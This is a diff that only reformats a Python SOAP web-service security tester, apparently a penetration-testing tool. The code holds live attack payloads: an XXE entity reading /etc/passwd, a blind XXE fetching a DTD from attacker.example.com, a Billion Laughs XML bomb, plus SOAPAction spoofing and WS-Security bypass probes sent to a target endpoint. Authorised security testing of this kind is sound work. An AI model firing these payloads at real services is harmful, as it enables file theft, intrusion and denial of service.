@@ -74,6 +74,7 @@ import re
 from typing import List, Dict, Optional
 from dataclasses import dataclass
 
+
 @dataclass
 class SOAPOperation:
     name: str
@@ -82,13 +83,14 @@ class SOAPOperation:
     output_message: str
     parameters: List[Dict]
 
+
 class SOAPSecurityTester:
     NAMESPACES = {
-        'wsdl': 'http://schemas.xmlsoap.org/wsdl/',
-        'soap': 'http://schemas.xmlsoap.org/wsdl/soap/',
-        'soap12': 'http://schemas.xmlsoap.org/wsdl/soap12/',
-        'xsd': 'http://www.w3.org/2001/XMLSchema',
-        'wsse': 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd',
+        "wsdl": "http://schemas.xmlsoap.org/wsdl/",
+        "soap": "http://schemas.xmlsoap.org/wsdl/soap/",
+        "soap12": "http://schemas.xmlsoap.org/wsdl/soap12/",
+        "xsd": "http://www.w3.org/2001/XMLSchema",
+        "wsse": "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd",
     }
 
     def __init__(self, wsdl_url: str, endpoint_url: Optional[str] = None):
@@ -104,23 +106,17 @@ class SOAPSecurityTester:
 
         # Extract endpoint URL if not provided
         if not self.endpoint_url:
-            address = root.find('.//soap:address', self.NAMESPACES)
+            address = root.find(".//soap:address", self.NAMESPACES)
             if address is not None:
-                self.endpoint_url = address.get('location')
+                self.endpoint_url = address.get("location")
 
         # Extract operations
-        for binding_op in root.findall('.//wsdl:binding/wsdl:operation', self.NAMESPACES):
-            name = binding_op.get('name')
-            soap_op = binding_op.find('soap:operation', self.NAMESPACES)
-            action = soap_op.get('soapAction', '') if soap_op is not None else ''
+        for binding_op in root.findall(".//wsdl:binding/wsdl:operation", self.NAMESPACES):
+            name = binding_op.get("name")
+            soap_op = binding_op.find("soap:operation", self.NAMESPACES)
+            action = soap_op.get("soapAction", "") if soap_op is not None else ""
 
-            operation = SOAPOperation(
-                name=name,
-                action=action,
-                input_message="",
-                output_message="",
-                parameters=[]
-            )
+            operation = SOAPOperation(name=name, action=action, input_message="", output_message="", parameters=[])
             self.operations.append(operation)
 
         print(f"[+] Found {len(self.operations)} SOAP operations")
@@ -135,7 +131,7 @@ class SOAPSecurityTester:
             # Classic XXE - File read
             {
                 "name": "Classic XXE (file read)",
-                "payload": '''<?xml version="1.0" encoding="UTF-8"?>
+                "payload": """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
@@ -143,12 +139,12 @@ class SOAPSecurityTester:
   <soapenv:Body>
     <{operation}>&xxe;</{operation}>
   </soapenv:Body>
-</soapenv:Envelope>'''.format(operation=operation.name)
+</soapenv:Envelope>""".format(operation=operation.name),
             },
             # Blind XXE - Out-of-band
             {
                 "name": "Blind XXE (OOB)",
-                "payload": '''<?xml version="1.0" encoding="UTF-8"?>
+                "payload": """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "http://attacker.example.com/xxe.dtd">
   %xxe;
@@ -157,12 +153,12 @@ class SOAPSecurityTester:
   <soapenv:Body>
     <{operation}>test</{operation}>
   </soapenv:Body>
-</soapenv:Envelope>'''.format(operation=operation.name)
+</soapenv:Envelope>""".format(operation=operation.name),
             },
             # XML Bomb (Billion Laughs)
             {
                 "name": "XML Bomb (Billion Laughs)",
-                "payload": '''<?xml version="1.0" encoding="UTF-8"?>
+                "payload": """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE lolz [
   <!ENTITY lol "lol">
   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
@@ -173,8 +169,8 @@ class SOAPSecurityTester:
   <soapenv:Body>
     <{operation}>&lol4;</{operation}>
   </soapenv:Body>
-</soapenv:Envelope>'''.format(operation=operation.name)
-            }
+</soapenv:Envelope>""".format(operation=operation.name),
+            },
         ]
 
         results = []
@@ -187,7 +183,7 @@ class SOAPSecurityTester:
                         "Content-Type": "text/xml; charset=utf-8",
                         "SOAPAction": operation.action,
                     },
-                    timeout=10
+                    timeout=10,
                 )
 
                 vulnerable = False
@@ -209,24 +205,23 @@ class SOAPSecurityTester:
                     "vulnerable": vulnerable,
                     "status_code": response.status_code,
                     "response_time": response.elapsed.total_seconds(),
-                    "indicators": indicators
+                    "indicators": indicators,
                 }
                 results.append(result)
 
                 if vulnerable:
-                    self.findings.append({
-                        "severity": "CRITICAL",
-                        "type": "XXE",
-                        "operation": operation.name,
-                        "details": xxe["name"]
-                    })
+                    self.findings.append(
+                        {"severity": "CRITICAL", "type": "XXE", "operation": operation.name, "details": xxe["name"]}
+                    )
 
             except requests.exceptions.Timeout:
-                results.append({
-                    "test": xxe["name"],
-                    "vulnerable": True,
-                    "indicators": ["Request timed out - possible DoS via XML bomb"]
-                })
+                results.append(
+                    {
+                        "test": xxe["name"],
+                        "vulnerable": True,
+                        "indicators": ["Request timed out - possible DoS via XML bomb"],
+                    }
+                )
 
         return {"operation": operation.name, "xxe_results": results}
 
@@ -242,13 +237,13 @@ class SOAPSecurityTester:
 
         results = []
         for payload in sqli_payloads:
-            soap_body = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+            soap_body = f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
     <{operation.name}>
       <param>{payload}</param>
     </{operation.name}>
   </soapenv:Body>
-</soapenv:Envelope>'''
+</soapenv:Envelope>"""
 
             try:
                 response = requests.post(
@@ -258,30 +253,39 @@ class SOAPSecurityTester:
                         "Content-Type": "text/xml; charset=utf-8",
                         "SOAPAction": operation.action,
                     },
-                    timeout=15
+                    timeout=15,
                 )
 
                 sql_errors = [
-                    "SQL syntax", "ORA-", "mysql_", "SQLSTATE",
-                    "Microsoft OLE DB", "Unclosed quotation mark",
-                    "syntax error", "PostgreSQL"
+                    "SQL syntax",
+                    "ORA-",
+                    "mysql_",
+                    "SQLSTATE",
+                    "Microsoft OLE DB",
+                    "Unclosed quotation mark",
+                    "syntax error",
+                    "PostgreSQL",
                 ]
                 error_found = any(err in response.text for err in sql_errors)
 
                 if error_found:
-                    self.findings.append({
-                        "severity": "CRITICAL",
-                        "type": "SQL Injection",
-                        "operation": operation.name,
-                        "details": f"SQL error triggered with: {payload[:30]}..."
-                    })
+                    self.findings.append(
+                        {
+                            "severity": "CRITICAL",
+                            "type": "SQL Injection",
+                            "operation": operation.name,
+                            "details": f"SQL error triggered with: {payload[:30]}...",
+                        }
+                    )
 
-                results.append({
-                    "payload": payload,
-                    "status_code": response.status_code,
-                    "sql_error_detected": error_found,
-                    "response_time": response.elapsed.total_seconds()
-                })
+                results.append(
+                    {
+                        "payload": payload,
+                        "status_code": response.status_code,
+                        "sql_error_detected": error_found,
+                        "response_time": response.elapsed.total_seconds(),
+                    }
+                )
 
             except requests.exceptions.RequestException:
                 continue
@@ -298,13 +302,13 @@ class SOAPSecurityTester:
                     continue
 
                 # Send request with mismatched SOAPAction
-                soap_body = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+                soap_body = f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Body>
     <{operation.name}>
       <param>test</param>
     </{operation.name}>
   </soapenv:Body>
-</soapenv:Envelope>'''
+</soapenv:Envelope>"""
 
                 try:
                     response = requests.post(
@@ -314,21 +318,21 @@ class SOAPSecurityTester:
                             "Content-Type": "text/xml; charset=utf-8",
                             "SOAPAction": other_op.action,  # Wrong action
                         },
-                        timeout=10
+                        timeout=10,
                     )
 
                     if response.status_code == 200 and "Fault" not in response.text:
-                        self.findings.append({
-                            "severity": "HIGH",
-                            "type": "SOAPAction Spoofing",
-                            "operation": operation.name,
-                            "details": f"Accepted with SOAPAction of {other_op.name}"
-                        })
-                        results.append({
-                            "body_operation": operation.name,
-                            "spoofed_action": other_op.action,
-                            "accepted": True
-                        })
+                        self.findings.append(
+                            {
+                                "severity": "HIGH",
+                                "type": "SOAPAction Spoofing",
+                                "operation": operation.name,
+                                "details": f"Accepted with SOAPAction of {other_op.name}",
+                            }
+                        )
+                        results.append(
+                            {"body_operation": operation.name, "spoofed_action": other_op.action, "accepted": True}
+                        )
 
                 except requests.exceptions.RequestException:
                     continue
@@ -338,66 +342,61 @@ class SOAPSecurityTester:
     def test_ws_security_bypass(self) -> dict:
         """Test WS-Security token handling."""
         test_cases = [
-            {
-                "name": "Missing WS-Security header",
-                "header": ""
-            },
+            {"name": "Missing WS-Security header", "header": ""},
             {
                 "name": "Empty security token",
-                "header": '''<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+                "header": """<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
     <wsse:UsernameToken>
       <wsse:Username></wsse:Username>
       <wsse:Password></wsse:Password>
     </wsse:UsernameToken>
-  </wsse:Security>'''
+  </wsse:Security>""",
             },
             {
                 "name": "Expired timestamp",
-                "header": '''<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
+                "header": """<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
     xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
     <wsu:Timestamp>
       <wsu:Created>2020-01-01T00:00:00Z</wsu:Created>
       <wsu:Expires>2020-01-01T00:05:00Z</wsu:Expires>
     </wsu:Timestamp>
-  </wsse:Security>'''
-            }
+  </wsse:Security>""",
+            },
         ]
 
         results = []
         for test in test_cases:
             if self.operations:
                 operation = self.operations[0]
-                soap_body = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+                soap_body = f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header>
     {test["header"]}
   </soapenv:Header>
   <soapenv:Body>
     <{operation.name}><param>test</param></{operation.name}>
   </soapenv:Body>
-</soapenv:Envelope>'''
+</soapenv:Envelope>"""
 
                 try:
                     response = requests.post(
                         self.endpoint_url,
                         data=soap_body,
                         headers={"Content-Type": "text/xml; charset=utf-8"},
-                        timeout=10
+                        timeout=10,
                     )
 
                     accepted = response.status_code == 200 and "Fault" not in response.text
                     if accepted:
-                        self.findings.append({
-                            "severity": "CRITICAL",
-                            "type": "WS-Security Bypass",
-                            "operation": operation.name,
-                            "details": test["name"]
-                        })
+                        self.findings.append(
+                            {
+                                "severity": "CRITICAL",
+                                "type": "WS-Security Bypass",
+                                "operation": operation.name,
+                                "details": test["name"],
+                            }
+                        )
 
-                    results.append({
-                        "test": test["name"],
-                        "accepted": accepted,
-                        "status_code": response.status_code
-                    })
+                    results.append({"test": test["name"], "accepted": accepted, "status_code": response.status_code})
                 except requests.exceptions.RequestException:
                     continue
 
@@ -412,7 +411,7 @@ class SOAPSecurityTester:
             "total_findings": len(self.findings),
             "critical": len([f for f in self.findings if f["severity"] == "CRITICAL"]),
             "high": len([f for f in self.findings if f["severity"] == "HIGH"]),
-            "findings": self.findings
+            "findings": self.findings,
         }
 
 
@@ -432,15 +431,14 @@ def main():
     tester.test_ws_security_bypass()
 
     report = tester.generate_report()
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print(f"SOAP Security Assessment Report")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     print(f"Target: {report['target']}")
     print(f"Operations Tested: {report['operations_tested']}")
-    print(f"Findings: {report['total_findings']} "
-          f"(Critical: {report['critical']}, High: {report['high']})")
+    print(f"Findings: {report['total_findings']} (Critical: {report['critical']}, High: {report['high']})")
 
-    for finding in report['findings']:
+    for finding in report["findings"]:
         print(f"\n  [{finding['severity']}] {finding['type']}")
         print(f"  Operation: {finding['operation']}")
         print(f"  Details: {finding['details']}")
